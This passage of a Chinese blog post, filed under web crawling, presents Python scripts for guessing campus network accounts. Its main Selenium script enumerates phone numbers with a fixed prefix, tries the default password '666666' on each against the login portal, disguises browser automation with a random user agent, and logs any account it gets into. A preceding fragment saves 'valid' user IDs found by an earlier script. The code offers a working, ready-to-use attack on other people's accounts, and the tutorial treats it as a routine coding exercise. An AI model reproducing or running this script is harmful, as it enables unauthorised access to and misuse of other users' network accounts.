class=\"keyword\">in</span> results <span class=\"keyword\">if</span> result.get() <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 一次性将所有有效的用户ID写入文件</span></span><br><span class=\"line\">    valid_userIds_path = os.path.join(os.getcwd(), <span class=\"string\">&quot;valid_userId.txt&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(valid_userIds_path, <span class=\"string\">&quot;a&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> userId <span class=\"keyword\">in</span> valid_userIds:</span><br><span class=\"line\">            f.write(userId + <span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<h2 id=\"代码优化\"><a href=\"#代码优化\" class=\"headerlink\" title=\"代码优化\"></a>代码优化</h2><ul>\n<li><p>使用<code>requests.Session()</code>来减少每次请求都需要建立TCP连接的开销。</p>\n</li>\n<li><p>“有效性检查”仅存储有效的<code>userId</code>，最后一次性写入，而不是每次发现一个有效ID就写一次，减少磁盘I/O。</p>\n</li>\n<li><p>使用列表解析和<code>result.get()</code>直接从异步结果中提取有效用户ID。</p>\n</li>\n</ul>\n<h2 id=\"第二个实现版本selenium\"><a href=\"#第二个实现版本selenium\" class=\"headerlink\" title=\"第二个实现版本selenium\"></a>第二个实现版本<code>selenium</code></h2><p>我们也可以用Python的另一个强大的自动化库selenium来实现，selenium可以模拟浏览器操作。<br>我们既然能知道到联通的手机号码前缀，那么我们就可以通过selenium来模拟登录，手动输入密码，然后自动点击登录按钮</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.chrome.service <span class=\"keyword\">import</span> Service</span><br><span class=\"line\"><span class=\"keyword\">from</span> fake_useragent <span class=\"keyword\">import</span> UserAgent</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.common.by <span class=\"keyword\">import</span> By</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.support.ui <span class=\"keyword\">import</span> WebDriverWait</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.support <span class=\"keyword\">import</span> expected_conditions <span class=\"keyword\">as</span> EC</span><br><span class=\"line\"><span class=\"keyword\">from</span> lxml <span class=\"keyword\">import</span> etree</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">match_result</span>(<span class=\"params\">driver, index</span>):</span><br><span class=\"line\">    message = driver.page_source</span><br><span class=\"line\">    login_success = <span class=\"string\">&quot;您已经成功登录&quot;</span> <span class=\"keyword\">in</span> message</span><br><span class=\"line\">    tree = etree.HTML(message)</span><br><span class=\"line\">    info = tree.xpath(<span class=\"string\">&#x27;//form[@name=&quot;f1&quot;]/div[@class=&quot;edit_lobo_cell&quot;]/text()&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> info:</span><br><span class=\"line\">        data.loc[index, <span class=\"string\">&#x27;信息&#x27;</span>] = info[<span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        data.loc[index, <span class=\"string\">&#x27;信息&#x27;</span>] = <span class=\"string\">&#x27;未获取到信息&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(info)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> login_success</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">craw_internet</span>(<span class=\"params\">driver, start=<span class=\"number\">150</span>, end=<span class=\"number\">200</span></span>):</span><br><span class=\"line\">    base_url = <span class=\"string\">&#x27;http://10.100.10.100/&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(start, end):</span><br><span class=\"line\">        driver.get(base_url)</span><br><span class=\"line\"></span><br><span class=\"line\">        username = WebDriverWait(driver, <span class=\"number\">10</span>).until(</span><br><span class=\"line\">            EC.presence_of_element_located((By.XPATH, <span class=\"string\">&#x27;//form[@name=&quot;f3&quot;]//input[@name=&quot;DDDDD&quot;]&#x27;</span>)))</span><br><span class=\"line\">        password = driver.find_element(By.XPATH, <span class=\"string\">&#x27;//form[@name=&quot;f3&quot;]//input[@name=&quot;upass&quot;]&#x27;</span>)</span><br><span class=\"line\">        button = driver.find_element(By.XPATH, <span class=\"string\">&#x27;//form[@name=&quot;f3&quot;]//input[@name=&quot;0MKKey&quot;]&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        formatted_number = <span class=\"string\">f&#x27;1767399<span class=\"subst\">&#123;i:04d&#125;</span>&#x27;</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(formatted_number)</span><br><span class=\"line\">        index = <span class=\"built_in\">len</span>(data)  <span class=\"comment\"># 新数据添加的索引位置</span></span><br><span class=\"line\">        data.loc[index, <span class=\"string\">&#x27;账号&#x27;</span>] = formatted_number</span><br><span class=\"line\">        data.loc[index, <span class=\"string\">&#x27;密码&#x27;</span>] = <span class=\"string\">&quot;666666&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        username.clear()</span><br><span class=\"line\">        username.send_keys(formatted_number)</span><br><span class=\"line\">        password.clear()</span><br><span class=\"line\">        password.send_keys(<span class=\"string\">&quot;666666&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        button.click()</span><br><span class=\"line\">        time.sleep(<span class=\"number\">2</span>)  <span class=\"comment\"># 给予页面加载时间</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> match_result(driver, index):</span><br><span class=\"line\">            data.to_csv(<span class=\"string\">&#x27;校园网150-200.csv&#x27;</span>, index=<span class=\"literal\">False</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>  <span class=\"comment\"># 成功登录后退出循环</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                back = WebDriverWait(driver, <span class=\"number\">5</span>).until(</span><br><span class=\"line\">                    EC.element_to_be_clickable((By.XPATH, <span class=\"string\">&#x27;//form[@name=&quot;f1&quot;]//input[@name=&quot;GobackButton&quot;]&#x27;</span>)))</span><br><span class=\"line\">                back.click()</span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;未找到返回按钮, <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    data = pd.DataFrame(columns=[<span class=\"string\">&#x27;账号&#x27;</span>, <span class=\"string\">&#x27;密码&#x27;</span>, <span class=\"string\">&#x27;信息&#x27;</span>])</span><br><span class=\"line\">    user_agent = UserAgent().random</span><br><span class=\"line\">    options = webdriver.ChromeOptions()</span><br><span class=\"line\">    options.add_argument(<span class=\"string\">f&#x27;user-agent=<span class=\"subst\">&#123;user_agent&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    options.add_experimental_option(<span class=\"string\">&quot;excludeSwitches&quot;</span>, [<span class=\"string\">&quot;enable-automation&quot;</span>])</span><br><span class=\"line\">    </span><br><span class=\"line\">    service = Service(executable_path=<span class=\"string\">&#x27;../driver/chromedriver.exe&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">with</span> webdriver.Chrome(service=service, options=options) <span class=\"keyword\">as</span> driver:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            craw_internet(driver)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;发生异常：<span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">            data.to_csv(<span class=\"string\">&#x27;校园网150-200.csv&#x27;</span>, index=<span class=\"literal\">False</span>)  <span class=\"comment\"># 确保数据被保存</span></span><br></pre></td></tr></table></figure>\n<div class=\"note warning flat\"><p><code>craw_internet</code>的<code>start</code>和<code>end</code>参数可以设置为任意值，因为这是拼接电话号码的，但是注意不要超过四位数：0-9999</p>\n</div>\n<div class=\"note info flat\"><p>使用selenium库需要安装Chrome浏览器和ChromeDriver驱动，具体可以参考<a href=\"https://selenium-python.readthedocs.io/installation.html\">官方文档</a></p>\n</div>\n<h2 id=\"代码优化-1\"><a href=\"#代码优化-1\" class=\"headerlink\" title=\"代码优化\"></a>代码优化</h2><ul>\n<li><p>使用显式等待：通过<code>WebDriverWait</code>和<code>expected_conditions</code>来等待元素变为可操作的状态，避免了固定等待时间，使代码执行更加高效且具有鲁棒性。</p>\n</li>\n<li><p>更好的异常处理：确保即使在出现异常时，能够保存已收集的数据，并且优雅地关闭<code>webdriver</code>。</p>\n</li>\n<li><p>代码的结构调整：将登陆成功的检查逻辑与数据提取逻辑合并到<code>match_result</code>函数中，并在<code>craw_internet</code>函数内调用，从而简化了代码的逻辑流程。</p>\n</li>\n</ul>\n","categories":[{"name":"Web爬虫","path":"api/categories/Web爬虫.json"}],"tags":[{"name":"Python","path":"api/tags/Python.json"},{"name":"Web爬虫","path":"api/tags/Web爬虫.json"}]}